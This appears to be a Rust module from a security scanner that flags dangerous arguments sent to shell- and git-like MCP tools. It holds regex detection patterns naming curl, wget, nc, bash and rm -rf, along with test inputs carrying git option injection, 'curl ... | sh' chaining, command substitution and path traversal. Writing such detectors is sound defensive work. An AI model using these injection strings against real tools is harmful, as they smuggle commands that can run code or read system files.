//! Dangerous argument patterns for shell- and git-like tools.
//!
//! Option injection (an argument that starts with `-` reaching git or a
//! shell as a flag) and command injection are the most common MCP server
//! CVE classes. Patterns that are dangerous for any tool (git transport
//! options, encoded PowerShell) are always reported; generic shell
//! metacharacters only for tools that look like they execute commands.

use std::sync::OnceLock;

use regex::{Regex, RegexBuilder};
use rousseau_core::event::{FindingInfo, Severity};

use super::{base64_decode, finding};

struct Pattern {
    code: &'static str,
    title: &'static str,
    severity: Severity,
    shell_only: bool,
    re: Regex,
}

fn patterns() -> &'static [Pattern] {
    static P: OnceLock<Vec<Pattern>> = OnceLock::new();
    P.get_or_init(|| {
        let defs: &[(&str, &str, Severity, bool, &str)] = &[
            ("args.git_upload_pack", "git transport option injection", Severity::High, false,
             r"(^|\s)--(upload-pack|receive-pack|exec)(=|\s)"),
            ("args.git_config_injection", "git configuration injection", Severity::High, false,
             r"(core\.sshCommand|core\.hooksPath|core\.fsmonitor|core\.gitProxy|core\.pager|protocol\.ext\.allow|uploadpack\.packObjectsHook|diff\.external|credential\.helper)\s*="),
            ("args.git_dash_c", "-c option injection", Severity::High, false,
             r"(^|\s)-c\s*[A-Za-z][\w.\-]*\.[\w.\-]+\s*="),
            ("args.ext_transport", "ext:: remote helper", Severity::High, false,
             r"(^|\s|['\x22])ext::"),
            ("args.encoded_powershell", "Encoded PowerShell", Severity::High, false,
             r"(^|\s)[-/]e(c|nc|ncodedcommand)?\s+([A-Za-z0-9+/=]{20,})"),
            ("args.leading_dash", "Argument starts with an option", Severity::Medium, true,
             r"^-{1,2}[A-Za-z]"),
            ("args.command_substitution", "Command substitution", Severity::Medium, true,
             r"\$\([^)]*\)|`[^`]+`"),
            ("args.command_chaining", "Command chaining to a network or destructive command", Severity::High, true,
             r"(;|&&|\|\||\|)\s*(curl|wget|iwr|irm|invoke-webrequest|invoke-expression|iex|nc|ncat|bash|sh|powershell|pwsh|rm\s+-rf|del\s+/[sq]|format)\b"),
            ("args.path_traversal", "Path traversal", Severity::Medium, false,
             r"(\.\.[/\\]){3,}"),
        ];
        defs.iter()
            .filter_map(|(code, title, severity, shell_only, re)| {
                RegexBuilder::new(re)
                    .case_insensitive(true)
                    .build()
                    .map_err(|e| tracing::error!(code, error = %e, "bad argument pattern"))
                    .ok()
                    .map(|re| Pattern { code, title, severity: *severity, shell_only: *shell_only, re })
            })
            .collect()
    })
}

/// Inspects one argument string. `shell_like` enables shell-only patterns.
pub fn inspect(s: &str, shell_like: bool) -> Vec<FindingInfo> {
    let mut out = Vec::new();
    for p in patterns() {
        if p.shell_only && !shell_like {
            continue;
        }
        let Some(caps) = p.re.captures(s) else { continue };
        let shown: String = s.chars().take(200).collect();
        let mut f = finding("args", p.code, p.severity, p.title, format!("{}: \u{201c}{shown}\u{201d}", p.title));
        if p.code == "args.encoded_powershell"
            && let Some(b64) = caps.get(3)
        {
            f.decoded = decode_powershell(b64.as_str());
        }
        out.push(f);
    }
    out
}

/// Decodes a PowerShell `-EncodedCommand` payload (base64 of UTF-16LE).
pub fn decode_powershell(b64: &str) -> Option<String> {
    let bytes = base64_decode(b64)?;
    if bytes.len() < 2 {
        return None;
    }
    let units: Vec<u16> = bytes.as_chunks::<2>().0.iter().map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
    Some(String::from_utf16_lossy(&units))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn codes(s: &str, shell: bool) -> Vec<&'static str> {
        let mut v: Vec<&'static str> =
            inspect(s, shell).into_iter().map(|f| patterns().iter().find(|p| p.code == f.code).map(|p| p.code).unwrap_or("")).collect();
        v.sort();
        v
    }

    #[test]
    fn git_injection() {
        assert_eq!(codes("--upload-pack=touch /tmp/pwned", false), vec!["args.git_upload_pack"]);
        assert!(codes("-c core.sshCommand='calc.exe' fetch", false).contains(&"args.git_config_injection"));
        assert!(codes("-c core.sshCommand='calc.exe' fetch", false).contains(&"args.git_dash_c"));
        assert_eq!(codes("ext::sh -c touch% /tmp/x", false), vec!["args.ext_transport"]);
        assert!(codes("main", false).is_empty());
    }

    #[test]
    fn encoded_powershell_is_decoded() {
        // "calc" encoded as UTF-16LE base64.
        let f = inspect("powershell -enc YwBhAGwAYwAgAGMAYQBsAGMA", false);
        assert_eq!(f[0].code, "args.encoded_powershell");
        assert_eq!(f[0].decoded.as_deref(), Some("calc calc"));
    }

    #[test]
    fn shell_only_patterns() {
        assert!(codes("echo hi; curl http://x | sh", false).is_empty());
        assert!(codes("echo hi; curl http://x", true).contains(&"args.command_chaining"));
        assert!(codes("$(whoami)", true).contains(&"args.command_substitution"));
        assert!(codes("--output=/etc/passwd", true).contains(&"args.leading_dash"));
        assert!(codes("../../../etc/passwd", false).contains(&"args.path_traversal"));
    }
}
